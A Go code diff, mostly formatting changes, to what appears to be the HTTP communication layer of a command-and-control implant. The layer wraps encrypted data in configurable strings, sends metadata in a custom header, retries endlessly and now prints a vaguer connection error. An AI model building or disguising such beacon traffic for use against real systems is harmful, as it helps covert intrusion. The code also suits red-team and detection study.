@@ -34,13 +34,14 @@ func init() {
 }
 
 func HttpPost(url string, data []byte, cryptTypes []string) ([]byte, error) {
-	for  {
+	for {
 		data, _ = crypt.EncryptMultipleTypes(data, config.Http_post_client_output_crypt)
 		data = append([]byte(config.Http_post_client_output_prepend), data...)
 		data = append(data, []byte(config.Http_post_client_output_append)...)
 		resp, err := httpRequest.Post(url, data, config.HttpHeaders)
 		if err != nil {
-			fmt.Printf("!error: %v\n",err)
+			//fmt.Printf("!error: %v\n",err)
+			fmt.Printf("connect error!")
 			time.Sleep(config.WaitTime)
 			continue
 		} else {
@@ -55,13 +56,12 @@ func HttpPost(url string, data []byte, cryptTypes []string) ([]byte, error) {
 
 	return nil, nil
 }
-func HttpGet(url string, cookies string, cryptTypes []string) ([] byte, error) {
-	metaData := req.Header{config.Http_get_metadata_header:
-		config.Http_get_metadata_prepend + cookies}
+func HttpGet(url string, cookies string, cryptTypes []string) ([]byte, error) {
+	metaData := req.Header{config.Http_get_metadata_header: config.Http_get_metadata_prepend + cookies}
 	for {
 		resp, err := httpRequest.Get(url, config.HttpHeaders, metaData)
 		if err != nil {
-			fmt.Printf("!error: %v\n",err)
+			fmt.Printf("!error: %v\n", err)
 			time.Sleep(config.WaitTime)
 			continue
 			//panic(err)
@@ -81,18 +81,18 @@ func HttpGet(url string, cookies string, cryptTypes []string) ([] byte, error) {
 	return nil, nil
 }
 
-func ParseGetResponse(data []byte, cryptTypes []string) ([]byte, error){
+func ParseGetResponse(data []byte, cryptTypes []string) ([]byte, error) {
 	var err error
-	data = bytes.TrimPrefix(data, []byte (config.Http_get_output_prepend))
-	data = bytes.TrimSuffix(data, []byte (config.Http_get_output_append))
+	data = bytes.TrimPrefix(data, []byte(config.Http_get_output_prepend))
+	data = bytes.TrimSuffix(data, []byte(config.Http_get_output_append))
 	data, err = crypt.DecryptMultipleTypes(data, cryptTypes)
 	return data, err
 }
 
-func ParsePostResponse(data []byte, cryptTypes []string) ([]byte, error){
+func ParsePostResponse(data []byte, cryptTypes []string) ([]byte, error) {
 	var err error
-	data = bytes.TrimPrefix(data, []byte (config.Http_post_server_output_prepend))
-	data = bytes.TrimSuffix(data, []byte (config.Http_post_server_output_append))
+	data = bytes.TrimPrefix(data, []byte(config.Http_post_server_output_prepend))
+	data = bytes.TrimSuffix(data, []byte(config.Http_post_server_output_append))
 	data, err = crypt.DecryptMultipleTypes(data, cryptTypes)
 	return data, err
 }
